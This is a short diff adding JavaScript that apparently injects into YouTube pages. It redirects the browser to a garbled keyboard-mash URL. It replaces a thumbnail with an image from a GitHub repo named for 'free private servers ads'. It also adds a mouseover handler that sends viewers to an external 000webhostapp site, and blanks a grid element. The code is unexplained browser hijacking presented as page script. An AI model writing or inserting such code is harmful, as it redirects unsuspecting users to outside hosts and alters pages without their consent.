@@ -1,0 +1,7 @@
+window.location = "dmfksdfsklfksnckndskcdsfsd/fdfdfsdfsdf.dfdfdsfdflppfporpoproptrotr]rtprotproptorpotrpotprt.com" 
+
+
+
+
+
+var target = document.getElementsByClassName("style-scope yt-img-shadow")[16]; target.setAttribute("src","https://github.com/hentocum/FreePrivateServersAds/blob/main/he0telajpl1g.jpeg?raw=true");target.setAttribute("onmouseover","window.location = 'https://hentocum.000webhostapp.com/'");document.getElementsByClassName("style-scope ytd-rich-grid-media")[60].innerHTML = " ";
